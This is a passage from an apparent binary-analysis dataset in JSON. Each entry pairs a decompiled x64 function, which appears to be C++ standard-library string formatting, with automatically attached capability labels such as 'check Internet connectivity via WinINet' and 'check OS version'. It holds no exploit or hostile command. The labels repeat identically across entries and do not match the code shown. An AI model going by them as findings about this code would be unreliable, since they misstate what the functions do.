(ram,0x00014006dd73)\n// WARNING: Removing unreachable block (ram,0x00014006de23)\n// WARNING: Removing unreachable block (ram,0x00014006de35)\n// WARNING: Removing unreachable block (ram,0x00014006dd90)\n// WARNING: Removing unreachable block (ram,0x00014006de3e)\n// WARNING: Removing unreachable block (ram,0x00014006e9e6)\n// WARNING: Removing unreachable block (ram,0x00014006de4c)\n// WARNING: Removing unreachable block (ram,0x00014006de4f)\n// WARNING: Removing unreachable block (ram,0x00014006e925)\n// WARNING: Removing unreachable block (ram,0x00014006de59)\n// WARNING: Removing unreachable block (ram,0x00014006dd93)\n// WARNING: Removing unreachable block (ram,0x00014006ddae)\n// WARNING: Removing unreachable block (ram,0x00014006e560)\n// WARNING: Removing unreachable block (ram,0x00014006e9db)\n// WARNING: Removing unreachable block (ram,0x00014006e56e)\n// WARNING: Removing unreachable block (ram,0x00014006e571)\n// WARNING: Removing unreachable block (ram,0x00014006e914)\n// WARNING: Removing unreachable block (ram,0x00014006e57b)\n// WARNING: Removing unreachable block (ram,0x00014006ddb6)\n// WARNING: Removing unreachable block (ram,0x00014006e590)\n// WARNING: Removing unreachable block (ram,0x00014006e59e)\n// WARNING: Removing unreachable block (ram,0x00014006e97b)\n// WARNING: Removing unreachable block (ram,0x00014006ea51)\n// WARNING: Removing unreachable block (ram,0x00014006e98e)\n// WARNING: Removing unreachable block (ram,0x00014006e997)\n// WARNING: Removing unreachable block (ram,0x00014006ea44)\n// WARNING: Removing unreachable block (ram,0x00014006e9a2)\n// WARNING: Removing unreachable block (ram,0x00014006e611)\n// WARNING: Removing unreachable block (ram,0x00014006e103)\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.14006dad0(uint *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    int64_t arg3;\n    uint *puVar4;\n    uint64_t uVar5;\n    ulong *arg1_00;\n    ulong *in_R8;\n    uint64_t arg3_00;\n    ulong *in_R9;\n    int64_t iVar6;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack200;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    uStack120 = *in_R8;\n    uStack112 = *(in_R8 + 1);\n    uStack108 = *(in_R8 + 0xc);\n    uStack136 = *in_R9;\n    uStack128 = *(in_R9 + 1);\n    uStack124 = *(in_R9 + 0xc);\n    fcn.1400b9850(in_stack_00000028 + 0xd0);\n    arg3 = fcn.14002c080(0x140108450);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3 * 8;\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        arg1_00 = fcn.1400bc710(0x80);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x140118890;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.1400a0dc0(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.1400a38f0(*(in_stack_00000028 + 0xd0), arg1_00, arg3);\n        iVar6 = *piVar1;\n    }\n    iStack88 = fcn.14007b890(0, 0);\n    if (*(iVar6 + 0x20) != '\\0') {\n        fcn.14007d790(&iStack88, 0x20);\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    fcn.14007d790(aiStack80, 0x20);\n    uStack92 = *(iVar6 + 0x60);\n    iStack200 = 0;\n    do {\n        if (*(&uStack92 + iStack200) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014006dc48. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x14010bee0\n            puVar4 = (*(*(*(&uStack92 + iStack200) * 4 + 0x14010bee0) + 0x14010bee0))();\n            return puVar4;\n        }\n        iVar2 = iStack200;\n        iStack200 = iStack200 + 1;\n    } while (iVar2 + 1 < 4);\n    if ((1 < *(aiStack80[0] + -0x18)) && (uVar5 = fcn.140024dd0(aiStack80, 0x30, 0),  uVar5 != 0)) {\n        arg3_00 = *(aiStack80[0] + -0x18);\n        if (uVar5 == 0xffffffffffffffff) {\n            uVar5 = arg3_00 - 1;\n        }\n        if (uVar5 <= arg3_00) {\n            arg3_00 = uVar5;\n        }\n        fcn.14007d8a0(aiStack80, 0, arg3_00, 0);\n    }\n    if (*(iStack88 + -0x18) != 0) {\n        fcn.14007da40(&iStack88, 0);\n        cVar3 = fcn.1400b76a0(*(iVar6 + 0x10), *(iVar6 + 0x18), &iStack88);\n        if (cVar3 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    fcn.14007c220(in_stack_00000038, aiStack80);\n    cVar3 = fcn.140029ee0(&uStack120, &uStack136);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = uStack120;\n    arg1[1] = uStack120._4_4_;\n    arg1[2] = uStack112;\n    arg1[3] = uStack108;\n    fcn.14007bf20(aiStack80[0] + -0x18);\n    fcn.14007bf20(iStack88 + -0x18);\n    return arg1;\n}\n",
        "token_count": 2152
    },
    "14006eae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014006f5f3)\n// WARNING: Removing unreachable block (ram,0x00014006edd4)\n// WARNING: Removing unreachable block (ram,0x00014006eddd)\n// WARNING: Removing unreachable block (ram,0x00014006edea)\n// WARNING: Removing unreachable block (ram,0x00014006f640)\n// WARNING: Removing unreachable block (ram,0x00014006fa2c)\n// WARNING: Removing unreachable block (ram,0x00014006f64e)\n// WARNING: Removing unreachable block (ram,0x00014006f652)\n// WARNING: Removing unreachable block (ram,0x00014006f65d)\n// WARNING: Removing unreachable block (ram,0x00014006edf3)\n// WARNING: Removing unreachable block (ram,0x00014006edfe)\n// WARNING: Removing unreachable block (ram,0x00014006f713)\n// WARNING: Removing unreachable block (ram,0x00014006ee14)\n// WARNING: Removing unreachable block (ram,0x00014006ee1c)\n// WARNING: Removing unreachable block (ram,0x00014006ed74)\n// WARNING: Removing unreachable block (ram,0x00014006f36e)\n// WARNING: Removing unreachable block (ram,0x00014006ed7f)\n// WARNING: Removing unreachable block (ram,0x00014006ed83)\n// WARNING: Removing unreachable block (ram,0x00014006ee33)\n// WARNING: Removing unreachable block (ram,0x00014006ee45)\n// WARNING: Removing unreachable block (ram,0x00014006eda0)\n// WARNING: Removing unreachable block (ram,0x00014006ee4e)\n// WARNING: Removing unreachable block (ram,0x00014006f9f6)\n// WARNING: Removing unreachable block (ram,0x00014006ee5c)\n// WARNING: Removing unreachable block (ram,0x00014006ee5f)\n// WARNING: Removing unreachable block (ram,0x00014006f935)\n// WARNING: Removing unreachable block (ram,0x00014006ee69)\n// WARNING: Removing unreachable block (ram,0x00014006eda3)\n// WARNING: Removing unreachable block (ram,0x00014006edbe)\n// WARNING: Removing unreachable block (ram,0x00014006f570)\n// WARNING: Removing unreachable block (ram,0x00014006f9eb)\n// WARNING: Removing unreachable block (ram,0x00014006f57e)\n// WARNING: Removing unreachable block (ram,0x00014006f581)\n// WARNING: Removing unreachable block (ram,0x00014006f924)\n// WARNING: Removing unreachable block (ram,0x00014006f58b)\n// WARNING: Removing unreachable block (ram,0x00014006edc6)\n// WARNING: Removing unreachable block (ram,0x00014006f5a0)\n// WARNING: Removing unreachable block (ram,0x00014006f5ae)\n// WARNING: Removing unreachable block (ram,0x00014006f98b)\n// WARNING: Removing unreachable block (ram,0x00014006fa61)\n// WARNING: Removing unreachable block (ram,0x00014006f99e)\n// WARNING: Removing unreachable block (ram,0x00014006f9a7)\n// WARNING: Removing unreachable block (ram,0x00014006fa54)\n// WARNING: Removing unreachable block (ram,0x00014006f9b2)\n// WARNING: Removing unreachable block (ram,0x00014006f621)\n// WARNING: Removing unreachable block (ram,0x00014006f113)\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.14006eae0(uint *arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    int64_t arg3;\n    uint *puVar4;\n    uint64_t uVar5;\n    ulong *arg1_00;\n    ulong *in_R8;\n    uint64_t arg3_00;\n    ulong *in_R9;\n    int64_t iVar6;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    ulong in_stack_00000038;\n    int64_t iStack200;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    ulong uStack120;\n    uint uStack112;\n    uint uStack108;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    uStack120 = *in_R8;\n    uStack112 = *(in_R8 + 1);\n    uStack108 = *(in_R8 + 0xc);\n    uStack136 = *in_R9;\n    uStack128 = *(in_R9 + 1);\n    uStack124 = *(in_R9 + 0xc);\n    fcn.1400b9850(in_stack_00000028 + 0xd0);\n    arg3 = fcn.14002c080(0x140108460);\n    piVar1 = *(*(in_stack_00000028 + 0xd0) + 0x18) + arg3 * 8;\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        arg1_00 = fcn.1400bc710(0x80);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x1401188b0;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.1400a15e0(arg1_00, in_stack_00000028 + 0xd0);\n        fcn.1400a38f0(*(in_stack_00000028 + 0xd0), arg1_00, arg3);\n        iVar6 = *piVar1;\n    }\n    iStack88 = fcn.14007b890(0, 0);\n    if (*(iVar6 + 0x20) != '\\0') {\n        fcn.14007d790(&iStack88, 0x20);\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    fcn.14007d790(aiStack80, 0x20);\n    uStack92 = *(iVar6 + 0x60);\n    iStack200 = 0;\n    do {\n        if (*(&uStack92 + iStack200) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014006ec58. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x14010becc\n            puVar4 = (*(*(*(&uStack92 + iStack200) * 4 + 0x14010becc) + 0x14010becc))();\n            return puVar4;\n        }\n        iVar2 = iStack200;\n        iStack200 = iStack200 + 1;\n    } while (iVar2 + 1 < 4);\n    if ((1 < *(aiStack80[0] + -0x18)) && (uVar5 = fcn.140024dd0(aiStack80, 0x30, 0),  uVar5 != 0)) {\n        arg3_00 = *(aiStack80[0] + -0x18);\n        if (uVar5 == 0xffffffffffffffff) {\n            uVar5 = arg3_00 - 1;\n        }\n        if (uVar5 <= arg3_00) {\n            arg3_00 = uVar5;\n        }\n        fcn.14007d8a0(aiStack80, 0, arg3_00, 0);\n    }\n    if (*(iStack88 + -0x18) != 0) {\n        fcn.14007da40(&iStack88, 0);\n        cVar3 = fcn.1400b76a0(*(iVar6 + 0x10), *(iVar6 + 0x18), &iStack88);\n        if (cVar3 == '\\0') {\n            *in_stack_00000030 = *in_stack_00000030 | 4;\n        }\n    }\n    fcn.14007c220(in_stack_00000038, aiStack80);\n    cVar3 = fcn.140029ee0(&uStack120, &uStack136);\n    if (cVar3 != '\\0') {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = uStack120;\n    arg1[1] = uStack120._4_4_;\n    arg1[2] = uStack112;\n    arg1[3] = uStack108;\n    fcn.14007bf20(aiStack80[0] + -0x18);\n    fcn.14007bf20(iStack88 + -0x18);\n    return arg1;\n}\n",
        "token_count": 2160
    },
    "14007033": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140070330(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    int64_t **ppiVar1;\n    char cVar2;\n    int64_t *piVar3;\n    int64_t arg3_00;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong *arg1_00;\n    ulong uVar8;\n    uint64_t uVar9;\n    uint8_t *puVar10;\n    int64_t *piVar11;\n    uint64_t uVar12;\n    uint8_t *arg2;\n    int64_t *piVar13;\n    int32_t iVar14;\n    int64_t *piVar15;\n    char in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint64_t uStack176;\n    char *pcStack160;\n    uint64_t uStack152;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar3 = *arg3;\n    piVar15 = arg3[1];\n    iVar6 = fcn.1400b97f0(arg4 + 0xd0);\n    iVar7 = fcn.14002c080(0x140108430);\n    ppiVar1 = *(*(arg4 + 0xd0) + 0x18) + iVar7 * 8;\n    piVar13 = *ppiVar1;\n    if (piVar13 == NULL) {\n        arg1_00 = fcn.1400bc710(0x70);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x140118850;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.14009fd60(arg1_00, arg4 + 0xd0);\n        fcn.1400a38f0(*(arg4 + 0xd0), arg1_00, iVar7);\n        piVar13 = *ppiVar1;\n    }\n    arg2 = *in_stack_00000030;\n    piVar11 = arg2 + -0x18;\n    if (*arg2 == *(piVar13 + 100)) {\n        uStack92 = *(piVar13 + 0xc);\n        pcStack160 = piVar13[9];\n        uStack176 = piVar13[10];\n        if (*piVar11 == 0) goto code_r0x0001400703ff;\n        arg2 = arg2 + 1;\n    }\n    else {\n        uStack92 = *(piVar13 + 0x5c);\n        pcStack160 = piVar13[7];\n        uStack176 = piVar13[8];\n    }\n    if (arg2 < arg2 + *piVar11) {\n        puVar10 = arg2;\n        do {\n            if ((*(*(iVar6 + 0x30) + *puVar10 * 2) & 8) == 0) break;\n            puVar10 = puVar10 + 1;\n        } while (arg2 + *piVar11 != puVar10);\n        iVar6 = puVar10 - arg2;\n        if (iVar6 != 0) {\n            iStack88 = fcn.14007b890(0, 0);\n            fcn.14007d790(&iStack88, iVar6 * 2);\n            iVar5 = *(piVar13 + 0xb);\n            iVar14 = iVar6 - iVar5;\n            if (0 < iVar14) {\n                if (iVar5 < 0) {\n                    iVar14 = iVar6;\n                }\n                if (piVar13[3] == 0) {\n                    fcn.14007c880(&iStack88, arg2, iVar14);\n                }\n                else {\n                    fcn.14007bd00(&iStack88, 0, *(iStack88 + -0x18), iVar14 * 2);\n                    iVar7 = piVar13[3];\n                    arg3_00 = piVar13[2];\n                    cVar2 = *(piVar13 + 0x22);\n                    if (-1 < *(iStack88 + -8)) {\n                        fcn.14007b820(&iStack88);\n                    }\n                    iVar7 = fcn.1400b60e0(iStack88, cVar2, arg3_00, iVar7);\n                    if (-1 < *(iStack88 + -8)) {\n                        fcn.14007b820(&iStack88);\n                    }\n                    uVar12 = *(iStack88 + -0x18);\n                    uVar9 = iVar7 - iStack88;\n                    if (uVar12 < uVar9) {\n                        uVar8 = fcn.1400b7b60(0x14010b748, 0x14010b732, uVar9, uVar12);\n                        fcn.14007bf20(iStack88 + -0x18);\n                        uVar8 = fcn.140014f30(uVar8);\n                        fcn.1400bc860(uVar8);\n                        (**(*piVar13 + 8))(piVar13);\n                        do {\n                            uVar8 = fcn.1400bcd60();\n                            fcn.1400bc860(uVar8);\n                        } while( true );\n                    }\n                    fcn.14007d8a0(&iStack88, uVar9, uVar12 - uVar9, 0);\n                }\n                iVar5 = *(piVar13 + 0xb);\n            }\n            if (0 < iVar5) {\n                fcn.14007da40(&iStack88, *(piVar13 + 0x21));\n                if (iVar14 < 0) {\n                    fcn.14007c740(&iStack88, -iVar14, *(piVar13 + 0x65));\n                    fcn.14007c480(&iStack88, arg2, iVar6);\n                }\n                else {\n                    fcn.14007c480(&iStack88, arg2 + iVar14, *(piVar13 + 0xb));\n                }\n            }\n            uVar4 = *(arg4 + 0x18) & 0xb0;\n            uStack152 = uStack176 + *(iStack88 + -0x18);\n            if ((*(arg4 + 0x18) & 0x200) != 0) {\n                uStack152 = uStack152 + piVar13[6];\n            }\n            aiStack80[0] = fcn.14007b890(0, 0);\n            fcn.14007d790(aiStack80, uStack152 * 2);\n            uVar12 = *(arg4 + 0x10);\n            piVar11 = &uStack92;\n            do {\n                if (*piVar11 < 5) {\n    // switch table (5 cases) at 0x14010b794\n                    switch(*piVar11) {\n                    case 0:\n                        if (uVar4 == 0x10 && uStack152 < uVar12) {\n                            fcn.14007c740(aiStack80, uVar12 - uStack152, in_stack_00000028);\n                        }\n                        break;\n                    case 1:\n                        if (uVar4 == 0x10 && uStack152 < uVar12) {\n                            fcn.14007c740(aiStack80, uVar12 - uStack152, in_stack_00000028);\n                        }\n                        else {\n                            fcn.14007da40(aiStack80, in_stack_00000028);\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg4 + 0x19) & 2) != 0) {\n                            fcn.14007c480(aiStack80, piVar13[5], piVar13[6]);\n                        }\n                        break;\n                    case 3:\n                        if (uStack176 != 0) {\n                            fcn.14007da40(aiStack80, *pcStack160);\n                        }\n                        break;\n                    case 4:\n                        fcn.14007c590(aiStack80, &iStack88);\n                    }\n                }\n                piVar11 = piVar11 + 1;\n            } while (piVar11 != &iStack88);\n            if (1 < uStack176) {\n                fcn.14007c480(aiStack80, pcStack160 + 1, uStack176 - 1);\n            }\n            uVar9 = *(aiStack80[0] + -0x18);\n            if (uVar9 < uVar12) {\n                if (uVar4 == 0x20) {\n                    fcn.14007c740(aiStack80, uVar12 - uVar9, in_stack_00000028);\n                    uVar9 = uVar12;\n                }\n                else {\n                    fcn.14007bd00(aiStack80, 0, 0, uVar12 - uVar9);\n                    uVar9 = uVar12;\n                }\n            }\n            uVar12 = piVar15 & 0xffffffff;\n            if ((piVar15 == '\\0') && (iVar6 = (**(*piVar3 + 0x60))(piVar3, aiStack80[0], uVar9),  uVar9 != iVar6)) {\n                uVar12 = 1;\n            }\n            piVar15 = piVar15 & 0xffffffffffffff00 | uVar12 & 0xff;\n            fcn.14007bf20(aiStack80[0] + -0x18);\n            fcn.14007bf20(iStack88 + -0x18);\n        }\n    }\ncode_r0x0001400703ff:\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar15;\n    *arg1 = piVar3;\n    return arg1;\n}\n",
        "token_count": 2335
    },
    "1400709d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.1400709d0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    int64_t **ppiVar1;\n    char cVar2;\n    int64_t *piVar3;\n    int64_t arg3_00;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong *arg1_00;\n    ulong uVar8;\n    uint64_t uVar9;\n    uint8_t *puVar10;\n    int64_t *piVar11;\n    uint64_t uVar12;\n    uint8_t *arg2;\n    int64_t *piVar13;\n    int32_t iVar14;\n    int64_t *piVar15;\n    char in_stack_00000028;\n    uint8_t **in_stack_00000030;\n    uint64_t uStack176;\n    char *pcStack160;\n    uint64_t uStack152;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar3 = *arg3;\n    piVar15 = arg3[1];\n    iVar6 = fcn.1400b97f0(arg4 + 0xd0);\n    iVar7 = fcn.14002c080(0x140108440);\n    ppiVar1 = *(*(arg4 + 0xd0) + 0x18) + iVar7 * 8;\n    piVar13 = *ppiVar1;\n    if (piVar13 == NULL) {\n        arg1_00 = fcn.1400bc710(0x70);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x140118870;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x21) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x6f) = 0;\n        fcn.1400a0590(arg1_00, arg4 + 0xd0);\n        fcn.1400a38f0(*(arg4 + 0xd0), arg1_00, iVar7);\n        piVar13 = *ppiVar1;\n    }\n    arg2 = *in_stack_00000030;\n    piVar11 = arg2 + -0x18;\n    if (*arg2 == *(piVar13 + 100)) {\n        uStack92 = *(piVar13 + 0xc);\n        pcStack160 = piVar13[9];\n        uStack176 = piVar13[10];\n        if (*piVar11 == 0) goto code_r0x000140070a9f;\n        arg2 = arg2 + 1;\n    }\n    else {\n        uStack92 = *(piVar13 + 0x5c);\n        pcStack160 = piVar13[7];\n        uStack176 = piVar13[8];\n    }\n    if (arg2 < arg2 + *piVar11) {\n        puVar10 = arg2;\n        do {\n            if ((*(*(iVar6 + 0x30) + *puVar10 * 2) & 8) == 0) break;\n            puVar10 = puVar10 + 1;\n        } while (arg2 + *piVar11 != puVar10);\n        iVar6 = puVar10 - arg2;\n        if (iVar6 != 0) {\n            iStack88 = fcn.14007b890(0, 0);\n            fcn.14007d790(&iStack88, iVar6 * 2);\n            iVar5 = *(piVar13 + 0xb);\n            iVar14 = iVar6 - iVar5;\n            if (0 < iVar14) {\n                if (iVar5 < 0) {\n                    iVar14 = iVar6;\n                }\n                if (piVar13[3] == 0) {\n                    fcn.14007c880(&iStack88, arg2, iVar14);\n                }\n                else {\n                    fcn.14007bd00(&iStack88, 0, *(iStack88 + -0x18), iVar14 * 2);\n                    iVar7 = piVar13[3];\n                    arg3_00 = piVar13[2];\n                    cVar2 = *(piVar13 + 0x22);\n                    if (-1 < *(iStack88 + -8)) {\n                        fcn.14007b820(&iStack88);\n                    }\n                    iVar7 = fcn.1400b60e0(iStack88, cVar2, arg3_00, iVar7);\n                    if (-1 < *(iStack88 + -8)) {\n                        fcn.14007b820(&iStack88);\n                    }\n                    uVar12 = *(iStack88 + -0x18);\n                    uVar9 = iVar7 - iStack88;\n                    if (uVar12 < uVar9) {\n                        uVar8 = fcn.1400b7b60(0x14010b748, 0x14010b732, uVar9, uVar12);\n                        fcn.14007bf20(iStack88 + -0x18);\n                        uVar8 = fcn.140014f30(uVar8);\n                        fcn.1400bc860(uVar8);\n                        (**(*piVar13 + 8))(piVar13);\n                        do {\n                            uVar8 = fcn.1400bcd60();\n                            fcn.1400bc860(uVar8);\n                        } while( true );\n                    }\n                    fcn.14007d8a0(&iStack88, uVar9, uVar12 - uVar9, 0);\n                }\n                iVar5 = *(piVar13 + 0xb);\n            }\n            if (0 < iVar5) {\n                fcn.14007da40(&iStack88, *(piVar13 + 0x21));\n                if (iVar14 < 0) {\n                    fcn.14007c740(&iStack88, -iVar14, *(piVar13 + 0x65));\n                    fcn.14007c480(&iStack88, arg2, iVar6);\n                }\n                else {\n                    fcn.14007c480(&iStack88, arg2 + iVar14, *(piVar13 + 0xb));\n                }\n            }\n            uVar4 = *(arg4 + 0x18) & 0xb0;\n            uStack152 = uStack176 + *(iStack88 + -0x18);\n            if ((*(arg4 + 0x18) & 0x200) != 0) {\n                uStack152 = uStack152 + piVar13[6];\n            }\n            aiStack80[0] = fcn.14007b890(0, 0);\n            fcn.14007d790(aiStack80, uStack152 * 2);\n            uVar12 = *(arg4 + 0x10);\n            piVar11 = &uStack92;\n            do {\n                if (*piVar11 < 5) {\n    // switch table (5 cases) at 0x14010b780\n                    switch(*piVar11) {\n                    case 0:\n                        if (uVar4 == 0x10 && uStack152 < uVar12) {\n                            fcn.14007c740(aiStack80, uVar12 - uStack152, in_stack_00000028);\n                        }\n                        break;\n                    case 1:\n                        if (uVar4 == 0x10 && uStack152 < uVar12) {\n                            fcn.14007c740(aiStack80, uVar12 - uStack152, in_stack_00000028);\n                        }\n                        else {\n                            fcn.14007da40(aiStack80, in_stack_00000028);\n                        }\n                        break;\n                    case 2:\n                        if ((*(arg4 + 0x19) & 2) != 0) {\n                            fcn.14007c480(aiStack80, piVar13[5], piVar13[6]);\n                        }\n                        break;\n                    case 3:\n                        if (uStack176 != 0) {\n                            fcn.14007da40(aiStack80, *pcStack160);\n                        }\n                        break;\n                    case 4:\n                        fcn.14007c590(aiStack80, &iStack88);\n                    }\n                }\n                piVar11 = piVar11 + 1;\n            } while (piVar11 != &iStack88);\n            if (1 < uStack176) {\n                fcn.14007c480(aiStack80, pcStack160 + 1, uStack176 - 1);\n            }\n            uVar9 = *(aiStack80[0] + -0x18);\n            if (uVar9 < uVar12) {\n                if (uVar4 == 0x20) {\n                    fcn.14007c740(aiStack80, uVar12 - uVar9, in_stack_00000028);\n                    uVar9 = uVar12;\n                }\n                else {\n                    fcn.14007bd00(aiStack80, 0, 0, uVar12 - uVar9);\n                    uVar9 = uVar12;\n                }\n            }\n            uVar12 = piVar15 & 0xffffffff;\n            if ((piVar15 == '\\0') && (iVar6 = (**(*piVar3 + 0x60))(piVar3, aiStack80[0], uVar9),  uVar9 != iVar6)) {\n                uVar12 = 1;\n            }\n            piVar15 = piVar15 & 0xffffffffffffff00 | uVar12 & 0xff;\n            fcn.14007bf20(aiStack80[0] + -0x18);\n            fcn.14007bf20(iStack88 + -0x18);\n        }\n    }\ncode_r0x000140070a9f:\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar15;\n    *arg1 = piVar3;\n    return arg1;\n}\n",
        "token_count": 2340
    },
    "14007141": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140071410(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    ulong arg3_00;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong *arg1_00;\n    ulong uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int16_t *piVar12;\n    int64_t *piVar13;\n    int32_t iVar14;\n    int64_t *piVar15;\n    int64_t arg3_01;\n    uint16_t in_stack_00000028;\n    int16_t **in_stack_00000030;\n    uint64_t uStack176;\n    uint16_t *puStack160;\n    uint64_t uStack152;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar2 = *arg3;\n    piVar15 = arg3[1];\n    piVar5 = fcn.1400b9850(arg4 + 0xd0);\n    iVar6 = fcn.14002c080(0x140108450);\n    piVar13 = *(*(arg4 + 0xd0) + 0x18) + iVar6 * 8;\n    iVar8 = *piVar13;\n    if (iVar8 == 0) {\n        arg1_00 = fcn.1400bc710(0x80);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x140118890;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.1400a0dc0(arg1_00, arg4 + 0xd0);\n        fcn.1400a38f0(*(arg4 + 0xd0), arg1_00, iVar6);\n        iVar8 = *piVar13;\n    }\n    piVar12 = *in_stack_00000030;\n    if (*piVar12 == *(iVar8 + 100)) {\n        uStack92 = *(iVar8 + 0x60);\n        uStack176 = *(iVar8 + 0x50);\n        puStack160 = *(iVar8 + 0x48);\n        if (*(piVar12 + -0xc) != 0) {\n            piVar12 = piVar12 + 1;\n        }\n    }\n    else {\n        uStack92 = *(iVar8 + 0x5c);\n        puStack160 = *(iVar8 + 0x38);\n        uStack176 = *(iVar8 + 0x40);\n    }\n    iVar6 = (**(*piVar5 + 0x28))(piVar5, 8, piVar12, piVar12 + *(piVar12 + -0xc));\n    arg3_01 = iVar6 - piVar12 >> 1;\n    if (arg3_01 != 0) {\n        iStack88 = fcn.1400723d0(0, 0);\n        fcn.1400743c0(&iStack88, iVar6 - piVar12);\n        iVar4 